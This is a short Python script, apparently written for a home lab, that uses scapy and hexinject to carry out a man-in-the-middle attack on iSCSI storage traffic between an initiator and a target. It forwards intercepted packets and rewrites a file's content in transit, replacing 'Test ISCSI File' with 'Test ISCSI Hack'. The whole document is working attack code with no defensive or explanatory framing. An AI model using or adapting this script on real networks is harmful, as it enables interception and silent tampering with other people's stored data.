#!/etc/usr/python

from scapy.all import *
import sys

iface = "eth0"
filter = "ip"
#victim in this case is the initiator
VICTIM_IP = "192.168.1.190"
#The IP of this Kali Virtualbox system
MY_IP = "192.168.1.143"
# gateway is the target
TARGET_IP = "192.168.1.191"
#VICTIM_MAC = "### This is the MAC of this Kali virtual box - since its virtual it shouldn't change.###"
MY_MAC = "08:00:27:f2:ee:7c"
#target mac address
TARGET_MAC = "08:00:27:da:24:ee"
#initiator mac address
VICTIM_MAC = "08:00:27:26:ba:94" 
  
def parse_to_hex(packet):
    # lines below are to redirect hexdump to a file so that we can use in the python script again
    stdout = sys.stdout
    sys.stdout = open('packet.txt', 'w')
    hexdump(packet)
    sys.stdout.close()
    sys.stdout = stdout
    packet_str = open('packet.txt', 'r')
    packet_hex = ''
    #trimming the hexadecimal packet to get only the hexadecimal content
    for line in packet_str:
        hexline = line.split('   ')[1]
        hexline = hexline.replace('  ', ' ')
        packet_hex = packet_hex + ' ' + hexline
    packet_str.close()
    packet_hex = packet_hex.strip()
    return packet_hex

def handle_packet(packet):
    if (packet[IP].dst == TARGET_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the target machine
        packet[Ether].dst = TARGET_MAC
        packet_hex = parse_to_hex(packet)
        print packet_hex + "----"
        # packets with destination to the target machine are just sent
        os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
    elif (packet[IP].dst == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the initiator machine
        packet[Ether].dst = VICTIM_MAC
        packet_hex = parse_to_hex(packet)
        print packet_hex + "----"
        # if we find "Test ISCSI File" in hex in the packet, we modify it to "Test ISCSI Hack" and inject
        if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet_hex):
            packet_hex = packet_hex.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B")
            print "\n\n\nFOUND THE FILE CONTENT!\n\n\n"
            os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
        else: # else we just inject the original packet
            os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
sniff(prn=handle_packet, filter=filter, iface=iface, count=0)
